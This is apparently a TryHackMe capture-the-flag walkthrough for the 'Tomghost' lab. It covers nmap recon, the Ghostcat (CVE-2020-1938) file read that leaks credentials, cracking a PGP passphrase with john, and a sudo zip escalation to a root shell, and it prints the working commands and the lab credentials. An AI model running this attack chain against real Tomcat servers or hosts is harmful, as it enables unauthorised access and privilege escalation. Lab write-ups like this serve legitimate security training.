# Tomghost — TryHackMe Walkthrough

**Target IP:** 10.48.163.2  
**Attack Machine:** Kali Linux  
**Attack IP:** 192.168.192.149  
**Difficulty:** Easy  
**Flags:** 2

---

## Flags Captured

| # | Flag | Method |
|---|------|--------|
| 1 | Flag{...} | Ghostcat file read → SSH as skyfuck |
| 2 | Flag{...} | PGP decrypt → sudo zip privesc |

---

## Phase 1 — Reconnaissance

### Nmap Scan
```
nmap -sC -sV 10.48.163.2
```

**Open Ports:**
- 22/tcp — SSH (OpenSSH 7.2p2)
- 53/tcp — tcpwrapped
- 8009/tcp — AJP13 (Apache Jserv Protocol v1.3)
- 8080/tcp — HTTP (Apache Tomcat 9.0.30)

---

## Phase 2 — Ghostcat (CVE-2020-1938)

Tomcat 9.0.30 is vulnerable to **Ghostcat** — unauthenticated file read via the AJP connector on port 8009.

Read `WEB-INF/web.xml` to leak credentials:
```bash
python3 ghostcat.py 10.48.163.2 -p 8009 -f /WEB-INF/web.xml
```

Credentials found: **skyfuck:8730281lkjlkjdqlksalks**

---

## Phase 3 — SSH as skyfuck

```bash
ssh skyfuck@10.48.163.2
```

Files in home:
- `credential.pgp` — encrypted credentials
- `tryhackme.asc` — PGP private key

---

## Phase 4 — Crack PGP Passphrase

```bash
# Export and crack the PGP key
gpg2john tryhackme.asc > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Passphrase: alexandru
```

---

## Phase 5 — Decrypt Credentials

```bash
gpg --decrypt credential.pgp
# merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

Switch to merlin:
```bash
su merlin
```

---

## Phase 6 — Privilege Escalation (sudo zip)

```bash
sudo -l
(root : root) NOPASSWD: /usr/bin/zip
```

GTFOBins technique:
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T --unzip-command="sh -c /bin/bash"
# Root shell obtained
```

---

## Phase 7 — Root Flag

```bash
cat /root/root.txt
Flag{...}
```

---

## Vulnerability Chain
1. **CVE-2020-1938 (Ghostcat)** — Unauthenticated file read via AJP connector
2. **Weak PGP Passphrase** — Crackable via rockyou
3. **Misconfigured Sudo** — Passwordless sudo on /usr/bin/zip enables root shell
